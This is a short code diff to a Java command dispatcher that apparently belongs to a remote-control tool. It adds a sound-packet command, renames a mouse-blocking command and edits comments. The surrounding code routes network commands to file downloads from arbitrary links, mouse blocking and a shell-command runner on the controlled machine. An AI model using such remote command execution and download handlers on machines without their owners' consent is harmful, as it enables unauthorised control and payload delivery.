@@ -14,6 +14,7 @@ import electron.networking.packets.ErrorPacket;
 import electron.networking.packets.ExplorerPacketInput;
 import electron.networking.packets.InputPacket;
 import electron.networking.packets.ScriptFilePacket;
+import electron.networking.packets.SoundsPacket;
 import electron.tools.Downloader;
 import electron.tools.FileOptions;
 import electron.tools.cmd;
@@ -49,6 +50,10 @@ public class CommandExecutor {
 				}
 			};
 			new Thread(editRunnable).start();
+			return;
+		}
+		if (command.equalsIgnoreCase("/player soundpacket")) {
+			Connection.send(new SoundsPacket(electron.functions.player.MusicManager.getPlayers()).get());
 			return;
 		}
 		logger.log("Executing: " + command);
@@ -122,7 +127,7 @@ public class CommandExecutor {
 			return;
 		}
 		// Block mouse
-		if (command.equalsIgnoreCase("/fixmouse")) {
+		if (command.equalsIgnoreCase("/blockmouse")) {
 			Connection.sendMessage(electron.functions.MouseTweaks.toggleMouseFixer());
 			return;
 		}
@@ -180,7 +185,7 @@ public class CommandExecutor {
 			Connection.sendMessage(message);
 			return;
 		}
-		// Download file from Internet
+		// Download file from Internet (link,name)
 		if (isMultiCommand("/download", command)) {
 			String[] args = getCommandArgs(command);
 			Runnable DownloadRunnable = new Runnable() {
@@ -201,7 +206,7 @@ public class CommandExecutor {
 			DownloadThread.start();
 			return;
 		}
-		// Cmd command
+		// CMD command
 		Runnable cmdRunnable = new Runnable() {
 			@Override
 			public void run() {
